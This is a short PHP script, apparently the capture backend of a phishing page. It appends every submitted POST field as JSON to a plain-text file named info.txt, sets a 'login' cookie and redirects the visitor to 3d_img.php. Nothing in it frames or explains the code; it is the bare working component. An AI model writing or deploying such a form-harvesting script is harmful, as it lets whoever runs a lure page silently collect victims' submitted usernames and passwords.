<?php
if(isset($_POST)){
    $myFile = "info.txt";
    $fh = fopen($myFile, 'a');
    fwrite($fh, json_encode($_POST) . PHP_EOL);
    fclose($fh);
    setcookie("login", time());
    header("location: 3d_img.php");
    exit();
}